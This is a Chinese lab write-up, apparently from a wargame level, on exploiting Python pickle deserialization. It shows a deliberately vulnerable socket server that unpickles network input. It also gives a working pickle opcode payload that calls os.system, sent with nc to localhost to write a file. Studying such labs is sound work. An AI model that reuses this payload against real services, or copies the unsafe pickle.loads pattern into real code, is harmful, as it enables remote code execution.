# <center>Linux下漏洞分析入门</center>

## 实验概述

### 【目的】
运行level17.py建立服务端，通过访问实现远程任意代码执行。
### 【环境】
Linux
### 【工具】

### 【原理】
序列化在计算机科学中通常有以下定义:

对同步控制而言，表示强制在同一时间内进行单一存取。
在数据储存与传送的部分是指将一个对象存储至一个储存媒介，例如档案或是记亿体缓冲等，或者透过网络传送资料时进行编码的过程，可以是字节或是XML等格式。而字节的或XML编码格式可以还原完全相等的对象。这程序被应用在不同应用程序之间传送对象，以及服务器将对象储存到档案或数据库。相反的过程又称为反序列化。
## 实验步骤

### 【步骤】
先查看服务端的python代码
```
#!/usr/bin/python

import os
import pickle
import time
import socket
import signal

signal.signal(signal.SIGCHLD, signal.SIG_IGN)

def server(skt):
  line = skt.recv(1024)

  obj = pickle.loads(line)

  for i in obj:
      clnt.send("why did you send me " + i + "?\n")

skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
skt.bind(('0.0.0.0', 10007))
skt.listen(10)

while True:
  clnt, addr = skt.accept()

  if(os.fork() == 0):
      clnt.send("Accepted connection from %s:%d" % (addr[0], addr[1]))
      server(clnt)
      exit(1)
```
该python脚本在端口10007上进行侦听，与服务器类似，等待连接，接受并读取我们提供的字符串，并且使用pickle.loads()来处理。
pickle 模块实现了一种算法，可以将任意一个 Python 对象转化为一系列的字节，也可以将这些字节重构为一个有相同特征的新对象。
由于字节可以被传输或者存储，因此 pickle 事实上实现了传递或者保存 Python 对象的功能。

这里的危险函数就是
```
obj = pickle.loads(line)
```
用户的输入不加检查的就被解释，我们可以利用pickle的操作码来构造shellcode。通过阅读pickle源码，可以了解到操作码如何构造。

c：引入模块
(s'<string>'：给函数提供参数
tR. :收尾

那么可以进行如下构造
```
$ cat lx
cos
system
(S'<要发送的命令>'
tR.
```

尝试连接并发送
```
$ cat lx
cos
system
(S'echo goiit > test'
tR.
$ cat lx | nc 127.0.0.1 10007
Accepted connection from 127.0.0.1:38766
^C
$ cat test
goiit

```

### 【总结】

本次实验了解了pickle的反序列化漏洞。
对于预防这种漏洞，一定要对用户的输入数据严格检查，不要信任任何用户输入。